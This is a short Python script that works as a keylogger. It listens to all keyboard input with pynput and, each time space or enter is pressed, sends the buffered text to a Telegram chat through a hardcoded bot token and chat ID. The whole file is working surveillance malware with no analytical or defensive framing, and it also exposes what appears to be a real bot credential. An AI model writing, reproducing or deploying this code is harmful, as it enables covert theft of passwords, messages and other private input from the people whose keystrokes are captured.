from pynput import keyboard
import requests

TELEGRAM_TOKEN = '7487368327:AAG3qLN8GXhb1thhE0brlWgcisIDtFwnick'
CHAT_ID = '1174153911'
TELEGRAM_URL = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'

buffer = []

def send_to_telegram(message):
    """Sends a message to the specified Telegram chat."""
    payload = {
        'chat_id': CHAT_ID,
        'text': message
    }
    print(f"Sending message: {message}")  # Debug message
    try:
        response = requests.post(TELEGRAM_URL, data=payload)
        if response.status_code != 200:
            print(f'Error: {response.status_code} - {response.text}')
        else:
            print("Message sent successfully")
    except Exception as e:
        print(f'Failed to send message. Error: {e}')

def on_press(key):
    global buffer
    key_str = str(key)
    if key_str == 'Key.space':
        message = ''.join(buffer).strip()
        if message:
            send_to_telegram(message)
        buffer = []
    elif key_str == 'Key.enter':
        message = ''.join(buffer).strip()
        if message:
            send_to_telegram(message)
        buffer = []
    elif len(key_str) == 3 and key_str.startswith("'") and key_str.endswith("'"):
        buffer.append(key_str[1])
    else:
        print("Special key pressed or non-printable character.")

with keyboard.Listener(on_press=on_press) as listener:
    print("Listening for key presses...")
    listener.join()